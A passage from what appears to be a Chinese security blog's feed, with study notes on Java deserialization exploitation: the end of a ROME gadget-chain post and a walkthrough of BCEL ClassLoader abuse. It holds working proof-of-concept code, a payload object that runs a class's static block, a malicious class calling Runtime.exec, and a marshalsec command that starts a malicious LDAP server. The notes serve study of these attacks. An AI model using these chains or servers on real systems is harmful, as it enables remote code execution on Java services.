class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Hello.class);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Hello&quot;</span>, templatesImpl);</span><br><span class="line">        setFieldValue(<span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;cls.getBytes()&#125;, templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, templatesImpl);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, objectBean1);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(objectBean2, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>(), templatesImpl);</span><br><span class="line"></span><br><span class="line">        Serialization.test(map);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(String name, Object value, Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HotSwappableTargetSource"><a href="#HotSwappableTargetSource" class="headerlink" title="HotSwappableTargetSource"></a>HotSwappableTargetSource</h2><p>这个其实我们在之前的文章，也就是西湖论剑的easy_api里提到过，一个拿来当跳板的类，这个类有equals方法，可以触发Xstring的toString，那么也就可以接上Rome的后半段</p><p>这里的话需要导入一个maven</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;5.3.12&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230508171236938.png" alt="image-20230508171236938"></p><p>这边的流程也很简单，首先入口还是hashmap，里面的putval函数调用了equals，然后key可控，然后就到了HotSwappableTargetSource里面的equals</p><p><img src="../images/image-20230508171756171.png" alt="image-20230508171756171"></p><p><strong>target：左边的是h2右边equals里面的是h1</strong></p><p>这里的target就是xstring，右边里面的内容就是ToStringBean，随之进入Xstring的equals方法里</p><p><img src="../images/image-20230508172034808.png" alt="image-20230508172034808"></p><p>然后这里的obj2就是前面右边的target，就是toStringBean</p><p>obj2就是ToStringBean，因此链子闭合，逻辑无误</p><p>然后链子就构造完成了</p><h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h3><p>这个类是在FastJson反序列化里见到的一个类，这个类中调用了lookup方法，因此可以进行JNDI注入，所以JDK版本也要注意一下，jdl8的话要小于191版本<br>这个类的入口点是在一个get方法上<code>JdbcRowSetImpl.getDatabaseMetaData()</code>,而rome链中又可以调用任意get方法，那其实也就和TempaltesImpl链思路是一样的，只是在不能使用TempaltesImpl时可以进行替换<br>这里介绍一个工具，marashalsec，用来起恶意ldap和rmi服务端的一个工具，很方便<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer [http://](http://127.0.0.1:8888/#EXP)localhost:8888/#Exploit 9999</code><br>在8888端口放上你的payload，这里就准备一个弹计算机的，名字改为Exploit</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://goodapple.top/archives/1145&quot;&gt;参考文章&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;从零开始分析&lt;/p&gt;
&lt;p&gt;ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象</summary>
      
    
    
    
    
    <category term="java反序列化-Rome" scheme="https://ke1nys.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Rome/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之BCEL ClassLoader</title>
    <link href="https://ke1nys.github.io/posts/30ead299.html"/>
    <id>https://ke1nys.github.io/posts/30ead299.html</id>
    <published>2023-04-25T12:46:38.000Z</published>
    <updated>2023-04-26T13:05:32.227Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel">参考文章</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>BCEL平常在测试反序列化的时候也经常会用到，比如延时测Gadget以及在某些场景下执行命令不是那么顺手的情况下选择BCEL去打内存马，就像Fastjson和Thymeleaf SSTI这种。以前也只是用到这个BCEL但是没有仔细学习过，下面简单学习记录下BCEL。</p><h1 id="Java安全之BCEL-ClassLoader"><a href="#Java安全之BCEL-ClassLoader" class="headerlink" title="Java安全之BCEL ClassLoader"></a>Java安全之BCEL ClassLoader</h1><p>目录</p><ul><li>Java安全之BCEL ClassLoader<ul><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#写在前面">写在前面</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel">About BCEL</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#调试分析">调试分析</a></li><li>食用姿势<ul><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#fuzz反序列化gadget">Fuzz反序列化Gadget</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#fastjson-bcel-payload">Fastjson BCEL Payload</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#thymeleaf-ssti-payload">Thymeleaf SSTI Payload</a></li></ul></li></ul></li></ul><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面#"></a>写在前面<a href="https://www.cnblogs.com/CoLo/p/15869871.html#写在前面">#</a></h2><p>BCEL平常在测试反序列化的时候也经常会用到，比如延时测Gadget以及在某些场景下执行命令不是那么顺手的情况下选择BCEL去打内存马，就像Fastjson和Thymeleaf SSTI这种。以前也只是用到这个BCEL但是没有仔细学习过，下面简单学习记录下BCEL。</p><h2 id="About-BCEL"><a href="#About-BCEL" class="headerlink" title="About BCEL"></a>About BCEL</h2><p>BCEL Classloader在 JDK &lt; 8u251之前是在rt.jar里面。<br>同时在Tomcat中也会存在相关的依赖<br>tomcat7</p><p>org.apache.tomcat.dbcp.dbcp.BasicDataSource</p><p>tomcat8及其以后</p><p>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><p>而在<code>rt.jar!/com/sun/org/apache/bcel/internal/util/</code>包下，有<code>Classloader</code>这么一个类，可以实现加载字节码并初始化一个类的功能，该类也是个Classloader（继承了原生的Classloader类）重写了<code>loadClass()</code>方法，源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span></span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First try: lookup hash table.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>((cl=(Class)classes.get(class_name)) == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">/* Second try: Load system class using system class loader. You better</span></span><br><span class="line"><span class="comment">       * don&#x27;t mess around with them.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; ignored_packages.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">          cl = deferTo.loadClass(class_name);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(cl == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Third try: Special request?</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">          clazz = createClass(class_name);</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">          <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = modifyClass(clazz);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">          cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">          cl = Class.forName(class_name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(resolve)</span><br><span class="line">        resolveClass(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先会判断类名是否以$$$BCEL$$$开头，之后调用<code>createClass()</code>方法拿到一个<code>JavaClass</code>对象最终通过<code>defineClass()</code>加载字节码还原类。</p><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>先来看下简单的使用，在同一包下，准备一个恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> MemoryShell.BCEL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>准备一个BCEL的demo,运行即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> MemoryShell.BCEL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">         <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(calc.class);</span><br><span class="line">         <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(), <span class="literal">true</span>);</span><br><span class="line">         System.out.println(code);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230425210508013.png" alt="image-20230425210508013"></p><p>这样就成功弹其计算器了</p><p>进入loadClass(),首先会判断类名是否以$$$BCEL$$$开头，之后调用<code>createClass()</code>方法拿到一个<code>JavaClass</code>对象最终通过<code>defineClass()</code>加载字节码还原类。</p><p><strong>这里原因就是刚开始对loadClass的分析</strong></p><p>那么我们就进行断点调试跟一下</p><p><img src="../images/image-20230425211759344.png" alt="image-20230425211759344"></p><p>这里由于我们前面给文件头加了个BCEl字节码，于是这里就可以进入createClass()</p><p><strong>createClass源码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">  <span class="type">int</span>    <span class="variable">index</span>     <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">  <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[]      bytes  = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">    <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    clazz = parser.parse();</span><br><span class="line">  &#125; <span class="keyword">catch</span>(Throwable e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Adapt the class name to the passed value</span></span><br><span class="line">  <span class="type">ConstantPool</span> <span class="variable">cp</span> <span class="operator">=</span> clazz.getConstantPool();</span><br><span class="line"></span><br><span class="line">  <span class="type">ConstantClass</span> <span class="variable">cl</span> <span class="operator">=</span> (ConstantClass)cp.getConstant(clazz.getClassNameIndex(),</span><br><span class="line">                                                   Constants.CONSTANT_Class);</span><br><span class="line">  <span class="type">ConstantUtf8</span> <span class="variable">name</span> <span class="operator">=</span> (ConstantUtf8)cp.getConstant(cl.getNameIndex(),</span><br><span class="line">                                                   Constants.CONSTANT_Utf8);</span><br><span class="line">  name.setBytes(class_name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>createClass()</code>中,通过<code>subString()</code>截取$$$BCEL$$$后的字符串，并调用<code>Utility.decode</code>进行相应的解码并最终返回改字节码的bytes数组(decode方法参数uncompress用来标识是否为zip流，当为true时走zip流解码)。之后生成<code>Parser</code>解析器并调用<code>parse()</code>方法进行解析，并生成<code>JavaClass</code>对象<br>createClass源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">    <span class="type">int</span>    <span class="variable">index</span>     <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">byte</span>[]      bytes  = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">      <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">      clazz = parser.parse();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Adapt the class name to the passed value</span></span><br><span class="line">    <span class="type">ConstantPool</span> <span class="variable">cp</span> <span class="operator">=</span> clazz.getConstantPool();</span><br><span class="line"></span><br><span class="line">    <span class="type">ConstantClass</span> <span class="variable">cl</span> <span class="operator">=</span> (ConstantClass)cp.getConstant(clazz.getClassNameIndex(),</span><br><span class="line">                                                     Constants.CONSTANT_Class);</span><br><span class="line">    <span class="type">ConstantUtf8</span> <span class="variable">name</span> <span class="operator">=</span> (ConstantUtf8)cp.getConstant(cl.getNameIndex(),</span><br><span class="line">                                                     Constants.CONSTANT_Utf8);</span><br><span class="line">    name.setBytes(class_name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230425212337403.png" alt="image-20230425212337403"></p><p>这里就是前面为什么要进行字节码编码的原因，因为这里会进行解码</p><p><strong>Utility.decode()源码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Decode a string back to a byte array.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bytes the byte array to convert</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uncompress use gzip to uncompress the stream of bytes</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] decode(String s, <span class="type">boolean</span> uncompress) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">  <span class="type">char</span>[] chars = s.toCharArray();</span><br><span class="line"></span><br><span class="line">  <span class="type">CharArrayReader</span> <span class="variable">car</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CharArrayReader</span>(chars);</span><br><span class="line">  <span class="type">JavaReader</span>      <span class="variable">jr</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaReader</span>(car);</span><br><span class="line"></span><br><span class="line">  <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> ch;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>((ch = jr.read()) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    bos.write(ch);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  bos.close();</span><br><span class="line">  car.close();</span><br><span class="line">  jr.close();</span><br><span class="line"></span><br><span class="line">  <span class="type">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(uncompress) &#123;</span><br><span class="line">    <span class="type">GZIPInputStream</span> <span class="variable">gis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes));</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] tmp   = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length * <span class="number">3</span>]; <span class="comment">// Rough estimate</span></span><br><span class="line">    <span class="type">int</span>    <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>    b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((b = gis.read()) &gt;= <span class="number">0</span>)</span><br><span class="line">      tmp[count++] = (<span class="type">byte</span>)b;</span><br><span class="line"></span><br><span class="line">    bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[count];</span><br><span class="line">    System.arraycopy(tmp, <span class="number">0</span>, bytes, <span class="number">0</span>, count);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后获取到了该<code>JavaClass</code>对象的bytes数组并调用java原生的<code>defineClass()</code>加载</p><p><img src="../images/image-20230425213242406.png" alt="image-20230425213242406"></p><p>之后就是在<code>newInstance()</code>时初始化触发静态代码块执行</p><p>之后调用<code>createClass()</code>方法拿到一个<code>JavaClass</code>对象最终通过<code>defineClass()</code>加载字节码还原类。</p><p><strong>这里就是为什么要用javaclass和utility编码的原因</strong></p><p><strong>上面的参考文章里还有一些题目是利用BCEl的，可以去参考参考一下</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel&quot;&gt;参考文章&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/</summary>
      
    
    
    
    
    <category term="BCEL Java ClassLoader" scheme="https://ke1nys.github.io/tags/BCEL-Java-ClassLoader/"/>
    
  </entry>
  
</feed>
